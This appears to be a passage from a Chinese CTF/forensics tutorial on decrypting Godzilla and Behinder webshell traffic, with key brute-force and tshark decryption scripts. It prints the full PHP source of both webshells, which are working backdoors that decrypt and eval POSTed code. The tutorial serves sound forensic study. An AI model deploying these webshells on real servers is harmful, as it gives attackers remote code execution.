<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-title function_ invoke__">session_start</span>();<br>@<span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>@<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-comment">// 编码器</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encode</span>(<span class="hljs-params"><span class="hljs-variable">$D</span>,<span class="hljs-variable">$K</span></span>)</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$D</span>);<span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$c</span> = <span class="hljs-variable">$K</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>];<br>        <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$c</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$D</span>;<br>&#125;<br><br><span class="hljs-variable">$pass</span>=<span class="hljs-string">&#x27;babyshell&#x27;</span>; <span class="hljs-comment">// 哥斯拉的连接密码</span><br><span class="hljs-variable">$payloadName</span>=<span class="hljs-string">&#x27;payload&#x27;</span>;<br><span class="hljs-variable">$key</span>=<span class="hljs-string">&#x27;421eb7f1b8e4b3cf&#x27;</span>;<span class="hljs-comment">// 哥斯拉流量的解密密钥</span><br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-variable">$pass</span>]))&#123;<br>    <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-variable">$pass</span>]),<span class="hljs-variable">$key</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>]))&#123;<br>        <span class="hljs-variable">$payload</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>],<span class="hljs-variable">$key</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-string">&quot;getBasicsInfo&quot;</span>)===<span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-variable">$payload</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-variable">$key</span>);<br>        &#125;<br>    		<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$payload</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>.<span class="hljs-variable">$key</span>),<span class="hljs-number">0</span>,<span class="hljs-number">16</span>); <span class="hljs-comment">// 输出MD5(连接密码+流量解密密钥)的前16位</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">encode</span>(@<span class="hljs-title function_ invoke__">run</span>(<span class="hljs-variable">$data</span>),<span class="hljs-variable">$key</span>));<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>.<span class="hljs-variable">$key</span>),<span class="hljs-number">16</span>); <span class="hljs-comment">// 输出MD5(连接密码+流量解密密钥)的后16位</span><br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$data</span>,<span class="hljs-string">&quot;getBasicsInfo&quot;</span>)!==<span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>]=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$data</span>,<span class="hljs-variable">$key</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>仔细观察上面的Webshell源码，关键部分我已经写上了对应的注释</p>
<p>哥斯拉流量解密的关键就在于<code>$key</code>这个密钥上，假如这个密钥未知，我们有什么办法去得到它呢</p>
<p>第一种最简单方法就是看看流量中有没有上传Webshell的源码，如果有，可以从源码中获得</p>
<p>第二种方法是我们可以结合请求和响应包中的数据，尝试去爆破这个解密密钥</p>
<p>这种方法就考察了哥斯拉流量的加密流程，因此我们需要去逆向分析一下这个密钥是如何生成的</p>
<p>Github上有开源的逆向后的源码：<a target="_blank" rel="noopener" href="https://github.com/Freakboy/Godzilla">https://github.com/Freakboy/Godzilla</a></p>
<p>其中，我们主要关注下面这段代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] generate(String password, String secretKey) &#123;<br>    <span class="hljs-keyword">return</span> Generate.GenerateShellLoder(password, functions.md5(secretKey).substring(<span class="hljs-number">0</span>, <span class="hljs-number">16</span>), <span class="hljs-literal">false</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>我们可以发现，哥斯拉的流量解密密钥是明文密钥MD5的前十六位，而这个明文密钥一般是可读的字符串</p>
<p>然后结合响应包中，会输出输出MD5(连接密码+流量解密密钥)的值</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$payload</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>.<span class="hljs-variable">$key</span>),<span class="hljs-number">0</span>,<span class="hljs-number">16</span>); <span class="hljs-comment">// 输出MD5(连接密码+流量解密密钥)的前16位</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">encode</span>(@<span class="hljs-title function_ invoke__">run</span>(<span class="hljs-variable">$data</span>),<span class="hljs-variable">$key</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>.<span class="hljs-variable">$key</span>),<span class="hljs-number">16</span>); <span class="hljs-comment">// 输出MD5(连接密码+流量解密密钥)的后16位</span><br></code></pre></td></tr></table></figure>

<p>因为连接密码可以从请求包中得到，就是请求包中POST传参的参数</p>
<p>因此，我们就可以尝试写一个脚本去爆破密钥</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md5_encode</span>(<span class="hljs-params">text</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(text.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).hexdigest()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">crack_key</span>(<span class="hljs-params">key_list,target_hash</span>):<br>    pwd = <span class="hljs-string">&quot;Antsword&quot;</span> <span class="hljs-comment"># 哥斯拉的连接密码</span><br>    <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> key_list:<br>        tmp = md5_encode(key) <span class="hljs-comment"># 明文密钥的MD5</span><br>        tmp_hash = md5_encode(pwd+tmp[:<span class="hljs-number">16</span>]) <span class="hljs-comment"># 响应中返回的hash</span><br>        <span class="hljs-keyword">if</span> tmp_hash == target_hash:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 密钥爆破成功: <span class="hljs-subst">&#123;key&#125;</span>&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 用于解密哥斯拉流量的密钥为 <span class="hljs-subst">&#123;tmp[:<span class="hljs-number">16</span>]&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> key<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-comment"># 响应中返回的hash</span><br>    target_hash = <span class="hljs-string">&quot;e71f50e9773b23f9792dea3a7ae385ca&quot;</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;dic.txt&quot;</span>,<span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        key_list = f.read().split()<br>    crack_key(key_list, target_hash)<br><br><span class="hljs-comment"># [+] 密钥爆破成功: Antsw0rd</span><br><span class="hljs-comment"># [+] 用于解密哥斯拉流量的密钥为 a18551e65c48f51e</span><br></code></pre></td></tr></table></figure>

<p>当然也可以直接用CTF-NetA爆破</p>
<p><img src="/imgs/image-20250515121809838.png" srcset="/img/loading.gif" lazyload></p>
<p>例题1-2024福建省数据安全大赛-gza_Cracker</p>
<p>例题2-2020HITCTF-Traffic</p>
<p>附：哥斯拉密钥爆破+流量批量解密脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> io<br><span class="hljs-keyword">import</span> gzip<br><span class="hljs-keyword">import</span> json<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> urllib.parse<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">url_decode</span>(<span class="hljs-params">encoded_str</span>):<br>    <span class="hljs-keyword">return</span> urllib.parse.unquote(encoded_str)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">xor_decode</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span>, key: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    result = <span class="hljs-built_in">bytearray</span>()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(data)):<br>        c = key[(i + <span class="hljs-number">1</span>) &amp; <span class="hljs-number">15</span>]<br>        result.append(data[i] ^ c)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(result)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gunzip_bytes</span>(<span class="hljs-params">compressed_data: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    <span class="hljs-keyword">with</span> gzip.GzipFile(fileobj=io.BytesIO(compressed_data)) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">return</span> f.read()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_traffic</span>(<span class="hljs-params">filename,key</span>):<br>    http_data = []<br>    command = [<br>        <span class="hljs-string">&quot;tshark&quot;</span>,  <span class="hljs-comment"># tshark的路径，如果在环境变量里这里就不用改</span><br>        <span class="hljs-string">&#x27;-r&#x27;</span>, filename,  <span class="hljs-comment"># 读取指定的 pcapng 文件</span><br>        <span class="hljs-string">&#x27;-Y&#x27;</span>, <span class="hljs-string">&#x27;http&#x27;</span>,  <span class="hljs-comment"># 过滤出 HTTP 数据包</span><br>        <span class="hljs-string">&#x27;-T&#x27;</span>, <span class="hljs-string">&#x27;json&#x27;</span>,  <span class="hljs-comment"># 输出为 JSON 格式</span><br>        <span class="hljs-string">&#x27;-e&#x27;</span>, <span class="hljs-string">&#x27;http.file_data&#x27;</span>,  <span class="hljs-comment"># 请求中的文件数据（POST 请求的内容）</span><br>        <span class="hljs-string">&#x27;-e&#x27;</span>, <span class="hljs-string">&#x27;http.response.phrase&#x27;</span>,  <span class="hljs-comment"># 响应短语</span><br>        <span class="hljs-string">&#x27;-e&#x27;</span>, <span class="hljs-string">&#x27;http.content_type&#x27;</span>  <span class="hljs-comment"># 响应内容类型</span><br>    ]<br>    result = subprocess.run(<br>        command, check=<span class="hljs-literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=<span class="hljs-literal">True</span>)<br>    json_output = json.loads(result.stdout)<br>    <span class="hljs-comment"># print(json.dumps(json_output, indent=4))  # 这个输出是用来调试的，可以移除</span><br><br>    <span class="hljs-comment"># 遍历 JSON 数据并提取字段</span><br>    <span class="hljs-keyword">for</span> packet <span class="hljs-keyword">in</span> json_output:<br>        layers = packet.get(<span class="hljs-string">&#x27;_source&#x27;</span>, &#123;&#125;).get(<span class="hljs-string">&#x27;layers&#x27;</span>, &#123;&#125;)<br>        request_method = layers.get(<span class="hljs-string">&#x27;http.request.method&#x27;</span>, [<span class="hljs-string">&#x27;None&#x27;</span>])[<span class="hljs-number">0</span>]<br>        response_code = layers.get(<span class="hljs-string">&#x27;http.response.code&#x27;</span>, [<span class="hljs-string">&#x27;None&#x27;</span>])[<span class="hljs-number">0</span>]<br>        file_data = layers.get(<span class="hljs-string">&#x27;http.file_data&#x27;</span>, [<span class="hljs-string">&#x27;None&#x27;</span>])[<span class="hljs-number">0</span>]<br>        <span class="hljs-keyword">try</span>:<br>            http_data.append(url_decode(<span class="hljs-built_in">bytes</span>.fromhex(file_data).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)))<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> http_data:<br>        <span class="hljs-comment"># print(item)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Antsword=&quot;</span> <span class="hljs-keyword">in</span> item:<br>            <span class="hljs-keyword">try</span>:<br>                enc = re.findall(<span class="hljs-string">r&quot;Antsword=(.*)&quot;</span>,item)[<span class="hljs-number">0</span>]<br>                <span class="hljs-comment"># print(enc)</span><br>                dec = xor_decode(base64.b64decode(enc),key.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>                dec = gunzip_bytes(dec).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>,errors=<span class="hljs-string">&#x27;ignore&#x27;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 请求: <span class="hljs-subst">&#123;dec&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">except</span>:<br>                <span class="hljs-keyword">pass</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;e71f50e9773b23f9&quot;</span> <span class="hljs-keyword">in</span> item:<br>            <span class="hljs-keyword">try</span>:<br>                enc = re.findall(<span class="hljs-string">r&quot;e71f50e9773b23f9(.*)792dea3a7ae385ca&quot;</span>,item)[<span class="hljs-number">0</span>]<br>                dec = xor_decode(base64.b64decode(enc),key.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>                dec = gunzip_bytes(dec).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>,errors=<span class="hljs-string">&#x27;ignore&#x27;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 响应: <span class="hljs-subst">&#123;dec&#125;</span>&quot;</span>)<br>            <span class="hljs-keyword">except</span>:<br>                <span class="hljs-keyword">pass</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md5_encode</span>(<span class="hljs-params">text</span>):<br>    <span class="hljs-keyword">return</span> hashlib.md5(text.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).hexdigest()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">crack_key</span>(<span class="hljs-params">key_list,target_hash</span>):<br>    pwd = <span class="hljs-string">&quot;Antsword&quot;</span> <span class="hljs-comment"># 哥斯拉的连接密码</span><br>    <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> key_list:<br>        tmp = md5_encode(key) <span class="hljs-comment"># 明文密钥的MD5</span><br>        tmp_hash = md5_encode(pwd+tmp[:<span class="hljs-number">16</span>]) <span class="hljs-comment"># 响应中返回的hash</span><br>        <span class="hljs-keyword">if</span> tmp_hash == target_hash:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 密钥爆破成功: <span class="hljs-subst">&#123;key&#125;</span>&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 用于解密哥斯拉流量的密钥为 <span class="hljs-subst">&#123;tmp[:<span class="hljs-number">16</span>]&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">return</span> key<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-comment"># 响应中返回的hash</span><br>    <span class="hljs-comment"># target_hash = &quot;e71f50e9773b23f9792dea3a7ae385ca&quot;</span><br>    <span class="hljs-comment"># with open(&quot;dic.txt&quot;,&#x27;r&#x27;) as f:</span><br>        <span class="hljs-comment"># key_list = f.read().split()</span><br>    <span class="hljs-comment"># crack_key(key_list, target_hash)</span><br>    <span class="hljs-comment"># [+] 密钥爆破成功: Antsw0rd</span><br>    <span class="hljs-comment"># [+] 用于解密哥斯拉流量的密钥为 a18551e65c48f51e</span><br>    decrypt_traffic(<span class="hljs-string">&#x27;Crack_me.pcap&#x27;</span>,<span class="hljs-string">&#x27;a18551e65c48f51e&#x27;</span>)<br></code></pre></td></tr></table></figure>

<h4 id="php-xor-raw"><a href="#php-xor-raw" class="headerlink" title="php_xor_raw"></a>php_xor_raw</h4><p>传输的数据类似于下图这种</p>
<p><img src="/imgs/image-20250226141615204.png" srcset="/img/loading.gif" lazyload></p>
<p>因此我们直接对照着加密逻辑，CyberChef解密请求和响应即可（当然这里也可以写个脚本批量解）</p>
<p><img src="/imgs/image-20250226141953586.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/imgs/image-20250226142116762.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="php-xor-base64"><a href="#php-xor-base64" class="headerlink" title="php_xor_base64"></a>php_xor_base64</h4><p><img src="/imgs/image-20250226142501601.png" srcset="/img/loading.gif" lazyload></p>
<p>加密逻辑和上面的一样，就是多了一个URL解码和Base64解码的过程</p>
<p><img src="/imgs/image-20250226142239379.png" srcset="/img/loading.gif" lazyload></p>
<p>然后响应的数据头尾会输出<code>md5(pass.key)</code>的前十六位和后十六位，解密的时候删去即可</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>.<span class="hljs-variable">$key</span>),<span class="hljs-number">0</span>,<span class="hljs-number">16</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">encode</span>(@<span class="hljs-title function_ invoke__">run</span>(<span class="hljs-variable">$data</span>),<span class="hljs-variable">$key</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>.<span class="hljs-variable">$key</span>),<span class="hljs-number">16</span>);<br></code></pre></td></tr></table></figure>

<p><img src="/imgs/image-20250226142441765.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="php-eval-xor-base64"><a href="#php-eval-xor-base64" class="headerlink" title="php_eval_xor_base64"></a>php_eval_xor_base64</h4><p><img src="/imgs/image-20250226142732540.png" srcset="/img/loading.gif" lazyload></p>
<p>这种情况下前面的数据<code>URL解码+reverse+Base64解码</code>后可以得到加密的key</p>
<p>然后执行的命令在第二个参数中，就是上图中的<code>babyshell</code></p>
<p>剩下的步骤就和之前一样了</p>
<p><img src="/imgs/image-20250226143409529.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="/imgs/image-20250226143429376.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="冰蝎流量分析"><a href="#冰蝎流量分析" class="headerlink" title="冰蝎流量分析"></a>冰蝎流量分析</h3><blockquote>
<p>冰蝎的默认密钥为：e45e329feb5d925b（md5(rebeyond)的前16位）</p>
<p>！！当找不到密钥或者密钥未知的时候可以尝试直接用默认密钥解密试一下！！</p>
</blockquote>
<p>或者也可以尝试用<code>PuzzleSolver</code>爆破一下密钥</p>
<p><img src="/imgs/image-20250424172707884.png" srcset="/img/loading.gif" lazyload></p>
<p>冰蝎流量的加密方式主要包括异或和AES，异或加密的话是和哥斯拉一样的</p>
<p>具体的加密代码如下所示：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br>	<span class="hljs-comment">// $key=&quot;e45e329feb5d925b&quot;; // 默认密钥</span><br>    <span class="hljs-variable">$key</span>=<span class="hljs-string">&quot;5b4582c9d56b5b33&quot;</span>;<br>	<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;k&#x27;</span>]=<span class="hljs-variable">$key</span>;<br>	<span class="hljs-variable">$post</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://input&quot;</span>);<br>	<span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">extension_loaded</span>(<span class="hljs-string">&#x27;openssl&#x27;</span>))<br>	&#123;<br>		<span class="hljs-variable">$t</span>=<span class="hljs-string">&quot;base64_&quot;</span>.<span class="hljs-string">&quot;decode&quot;</span>;<br>		<span class="hljs-variable">$post</span>=<span class="hljs-variable">$t</span>(<span class="hljs-variable">$post</span>.<span class="hljs-string">&quot;&quot;</span>);<br>		<br>		<span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$post</span>);<span class="hljs-variable">$i</span>++) &#123;<br>    			 <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$post</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$key</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>]; <br>    			&#125;<br>	&#125;<br>	<span class="hljs-keyword">else</span><br>	&#123;<br>		<span class="hljs-variable">$post</span>=<span class="hljs-title function_ invoke__">openssl_decrypt</span>(<span class="hljs-variable">$post</span>, <span class="hljs-string">&quot;AES128&quot;</span>, <span class="hljs-variable">$key</span>);<br>	&#125;<br>    <span class="hljs-variable">$arr</span>=<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-variable">$post</span>);<br>    <span class="hljs-variable">$func</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">0</span>];<br>    <span class="hljs-variable">$params</span>=<span class="hljs-variable">$arr</span>[<span class="hljs-number">1</span>];<br>	<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C</span></span>&#123;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"><span class="hljs-variable">$p</span></span>) </span>&#123;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$p</span>.<span class="hljs-string">&quot;&quot;</span>);&#125;&#125;<br>    @<span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>(),<span class="hljs-variable">$params</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<blockquote>
<p>大体功能是：POST接收加密数据，随后先进行Base64解码，再判断是否启用OpenSSL扩展，如果启用则使用AES解密，如果没有则使用密钥循环异或解密。Webshell在上传后，会先生成一段代码用于处理执行结果并加密返回给客户端，确保响应流量中的数据也是加密的，随后开始执行攻击者的命令，如果是PHP Webshell，在冰蝎客户端中点开该shell的时候会自动执行一次phpinfo，以上过程在流量中均有体现。</p>
</blockquote>
<h4 id="XOR-base64"><a href="#XOR-base64" class="headerlink" title="XOR_base64"></a>XOR_base64</h4><p>异或的情况和哥斯拉的有点像，把密钥的第一位放到最后一位然后解密即可</p>
<p><img src="/imgs/image-20250419164124175.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="AES-base64"><a href="#AES-base64" class="headerlink" title="AES_base64"></a>AES_base64</h4><p>当加密器用的是AES加密的时候就需要注意了</p>
<p>可能会有两种情况，一种是AES-ECB（没有IV），一种是AES-CBC（有IV）</p>
<p>如果是 AES-ECB，那直接用填入密钥解密即可，这里我们详细讨论一下 AES-CBC 的情况</p>
<blockquote>
<p>这里仅讨论默认PHP Webshell的情况，不同语言或不同Shell情况不同，需分情况对待</p>
</blockquote>
<p>冰蝎4.0的默认IV是：<code>\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</code></p>
<p>首先，需要分析那段PHP Webshell中的一句：<code>$post=openssl_decrypt($post, &quot;AES128&quot;, $key);</code></p>
